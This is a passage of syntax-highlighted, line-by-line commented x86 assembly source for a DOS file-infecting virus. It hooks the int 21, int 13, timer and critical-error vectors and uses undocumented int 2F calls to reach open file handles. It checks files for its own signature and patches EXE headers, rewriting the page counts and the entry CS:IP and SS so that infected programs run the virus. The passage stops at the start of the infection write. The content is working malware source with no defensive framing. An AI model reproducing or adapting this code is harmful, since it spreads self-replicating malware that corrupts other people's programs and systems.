             </span><span class="sc6">JMP</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int21off</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Jump to DOS</span><span class="sc0">

             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">9A</span><span class="sc0">      </span><span class="sc1">; ??????</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallDOS</span><span class="sc0">     </span><span class="sc1">; Call DOS int 21</span><span class="sc0">
             </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">ErrorProcess</span><span class="sc0">    </span><span class="sc1">; If error -&gt; Stop processing</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save file handle in BP</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3508</span><span class="sc0">     </span><span class="sc1">; Get timer interrupt</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallDOS</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerOff</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">    </span><span class="sc1">; and save it in variable</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerSeg</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; and to stack</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc0">       </span><span class="sc1">; Get in21</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallDOS</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; and save it on stack</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">       </span><span class="sc1">; Get critical error int</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallDOS</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; and store  it on stack</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">       </span><span class="sc1">; Get int 13 (disk I/O)</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallDOS</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; and save it on stack</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">       </span><span class="sc1">; Now he will SET vectors</span><span class="sc0">
             </span><span class="sc6">LDS</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13off</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load int13 bios address</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallDOS</span><span class="sc0">     </span><span class="sc1">; Set it in vector table</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc0">
             </span><span class="sc6">LDS</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dos21off</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load int21 dos address</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallDOS</span><span class="sc0">     </span><span class="sc1">; Set in vector table</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">       </span><span class="sc1">; Will set critical error handler</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">; Set DS point to vurus segment</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CriticalError</span><span class="sc0"> </span><span class="sc1">; Load its own critical handler</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Set in vector table</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">       </span><span class="sc1">; Set new timer</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerHandler</span><span class="sc0">  </span><span class="sc1">; Load its own timer</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Set in vector table</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; Restore file handle from BP to BX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; Save handle on stack</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1220</span><span class="sc0">     </span><span class="sc1">; Get handle table number</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallInt2F</span><span class="sc0">   </span><span class="sc1">; Via int2F (undocumented)</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load table number in BL</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1216</span><span class="sc0">     </span><span class="sc1">; Get table address</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">CallInt2F</span><span class="sc0">   </span><span class="sc1">; Via int2F (undocumented)</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; Restore file handle</span><span class="sc0">
             </span><span class="sc6">ADD</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0011</span><span class="sc0">     </span><span class="sc1">; ES:DI point to file size</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">0Fh</span><span class="sc4">],</span><span class="sc2">02</span><span class="sc0">   </span><span class="sc1">; Set file open mode (3Dxx) to Read/Write</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load DX:AX with file size</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">     </span><span class="sc1">; Check if file is less than 64k</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">BigEnough</span><span class="sc0">   </span><span class="sc1">; If less</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastCode</span><span class="sc0">  </span><span class="sc1">; Then check if file is less than virus</span><span class="sc0">
             </span><span class="sc6">JNC</span><span class="sc0">    </span><span class="sc5">BigEnough</span><span class="sc0">   </span><span class="sc1">; If file is larger than virus -&gt; fuck it</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">SkipFile</span><span class="sc0">    </span><span class="sc1">; else skip file</span><span class="sc0">
</span><span class="sc5">BigEnough</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSizeLow</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Save file size in variables</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSizeHi</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusAuthor</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndAuthor</span><span class="sc0">  </span><span class="sc1">; Decrease file size with sign size</span><span class="sc0">
             </span><span class="sc6">SBB</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Set current file position to point</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">   </span><span class="sc1">; Virus sign</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DI</span><span class="sc0">      </span><span class="sc1">; Save table handle table address</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3F</span><span class="sc0">       </span><span class="sc1">; Will read from file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndAuthor</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusAuthor</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastByte</span><span class="sc0">  </span><span class="sc1">; Load DS:DX point AFTER virus</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; DI point this area either</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Read file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirusAuthor</span><span class="sc0">   </span><span class="sc1">; DS:SI point virus sign</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndAuthor</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusAuthor</span><span class="sc0"> </span><span class="sc1">; Load CX sign size</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">; ES:DI point to readed byte</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">REP</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">       </span><span class="sc1">; Compare virus sign with readed bytes</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Restore handle table address</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">CleanFile</span><span class="sc0">   </span><span class="sc1">; If not equal -&gt; file is clean</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">SkipFile</span><span class="sc0">    </span><span class="sc1">; Else file infected -&gt; skip it</span><span class="sc0">
</span><span class="sc5">CleanFile</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">0000</span><span class="sc0">     </span><span class="sc1">; Set file pointer to 0L</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc2">0000</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3F</span><span class="sc0">       </span><span class="sc1">; Will read EXE header</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001B</span><span class="sc0">     </span><span class="sc1">; Size of EXE header</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastByte</span><span class="sc0">  </span><span class="sc1">; Read in buffer AFTER virus</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Set DS:SI point to readed header</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Read header</span><span class="sc0">
             </span><span class="sc6">JNC</span><span class="sc0">    </span><span class="sc5">NoErrorHeader</span><span class="sc0">   </span><span class="sc1">; If no error in read -&gt; go ahead</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">SkipFile</span><span class="sc0">    </span><span class="sc1">; If error occur -&gt; skip file</span><span class="sc0">
</span><span class="sc5">NoErrorHeader</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc2">4D4F</span><span class="sc0">     </span><span class="sc1">; Check in table if file is ?OM</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">NoComFile</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">InfectCOM</span><span class="sc0">
</span><span class="sc5">NoComFile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc2">4558</span><span class="sc0">  </span><span class="sc1">; Check for ?XE file</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">CheckForEXE</span><span class="sc0"> </span><span class="sc1">; If so -&gt; infect it</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">SkipFile</span><span class="sc0">    </span><span class="sc1">; Else skip file</span><span class="sc0">

</span><span class="sc5">CheckForEXE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17</span><span class="sc4">],</span><span class="sc2">45</span><span class="sc0">   </span><span class="sc1">; Check if file is realy an EXE-named</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">CheckEXEsign</span><span class="sc0">    </span><span class="sc1">; If so -&gt; check for MZ,ZM</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">SkipFile</span><span class="sc0">    </span><span class="sc1">; Else skip file</span><span class="sc0">

</span><span class="sc5">CheckEXEsign</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">  </span><span class="sc1">; Check for MZ</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">InfectEXE</span><span class="sc0">   </span><span class="sc1">; If so -&gt; infect file</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">4D5Ah</span><span class="sc0">  </span><span class="sc1">; Check for ZM</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">InfectEXE</span><span class="sc0">   </span><span class="sc1">; If so -&gt; infect file</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">SkipFile</span><span class="sc0">    </span><span class="sc1">; Otherwise -&gt; skip file</span><span class="sc0">

</span><span class="sc5">InfectEXE</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ComFlag</span><span class="sc4">],</span><span class="sc2">45h</span><span class="sc0">    </span><span class="sc1">; Set file type flag to EXE</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load AX with EXE file SS</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">SSegment</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; and save it</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load AX with EXE header IP</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">IPointer</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; and save it</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load AX with EXE header CS</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">CSegment</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; And save it</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastCode</span><span class="sc0">  </span><span class="sc1">; Load DX with virus CODE size</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Save it to stack</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc0">       </span><span class="sc1">; Compute virus size in</span><span class="sc0">
             </span><span class="sc6">SHR</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">       </span><span class="sc1">; 512 pages</span><span class="sc0">
             </span><span class="sc6">ADD</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0"> </span><span class="sc1">; Increase EXE file header size field</span><span class="sc0">
                        </span><span class="sc1">; with virus pages</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Restore virus size in DX</span><span class="sc0">
             </span><span class="sc6">AND</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">01FFh</span><span class="sc0">    </span><span class="sc1">; Compute reminder from VirusSize/512</span><span class="sc0">
             </span><span class="sc6">ADD</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Save value in EXE header</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0200</span><span class="sc0">  </span><span class="sc1">; Check virus reminder</span><span class="sc0">
             </span><span class="sc6">JL</span><span class="sc0"> </span><span class="sc5">NoAdjustRem</span><span class="sc0"> </span><span class="sc1">; If less than 512 -&gt; no adjust</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0200</span><span class="sc0">     </span><span class="sc1">; Else decrease reminder</span><span class="sc0">
             </span><span class="sc6">INC</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Increase EXE header page count</span><span class="sc0">
</span><span class="sc5">NoAdjustRem</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; Save correct reminder in EXE header</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load AX with file size in paragraphs</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Set DX to Zero</span><span class="sc0">

             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">LongMultiple16</span><span class="sc0">  </span><span class="sc1">; Get DX:AX file size in bytes</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSizeLow</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Correct saved file size</span><span class="sc0">
             </span><span class="sc6">SBB</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSizeHi</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">FileSizeLow</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Load DX:AX with corrected file size</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSizeHi</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">LongMultiple16</span><span class="sc0">      </span><span class="sc1">; DX:AX *= 0x10</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0008</span><span class="sc0">     </span><span class="sc1">; Calculate new entry CS:IP</span><span class="sc0">
             </span><span class="sc6">SHL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">       </span><span class="sc1">; DX/=0x100</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0004</span><span class="sc0">
             </span><span class="sc6">SHR</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">       </span><span class="sc1">; AX/=0x10</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Set entry CS:IP to EXE header</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">NewCS</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; Save new entry CS</span><span class="sc0">
             </span><span class="sc6">ADD</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0200</span><span class="sc0">     </span><span class="sc1">; Calculate new entry SS</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0E</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; Store it to EXE header</span><span class="sc0">

</span><span class="sc5">DoInfect</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">0000</span><span class="sc0"> </span><span class="sc1">; Set file pointer to 0L</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc2">0000</span><span class="sc0">
